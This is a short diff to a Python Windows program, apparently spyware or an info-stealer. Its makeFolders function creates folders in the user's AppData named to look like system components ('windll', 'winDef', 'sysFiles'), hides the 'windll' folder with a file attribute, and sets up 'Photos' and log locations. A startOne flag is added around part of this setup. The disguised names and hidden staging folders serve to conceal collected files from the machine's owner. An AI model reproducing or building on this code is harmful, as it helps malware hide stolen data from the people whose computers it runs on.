@@ -20,13 +20,14 @@ from win32api import SetFileAttributes
 """
 Makes all needed directories
 """
-def makeFolders(fileGrab):
+def makeFolders(fileGrab,startOne):
     pathf = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
     if os.path.exists(rf'{pathf}\windll'):
         print('none')
     else:
-        os.makedirs(rf'{pathf}\system\sysFiles\winDef')
-        open(rf'{pathf}\system\sysFiles\winDef\log20742384.txt', 'w', encoding='utf-8')
+        if startOne:
+            os.makedirs(rf'{pathf}\system\sysFiles\winDef')
+            open(rf'{pathf}\system\sysFiles\winDef\log20742384.txt', 'w', encoding='utf-8')
         os.makedirs(rf'{pathf}\windll\System')
         SetFileAttributes(rf'{pathf}\windll', FILE_ATTRIBUTE_HIDDEN)
         os.makedirs(rf'{pathf}\windll\Photos')
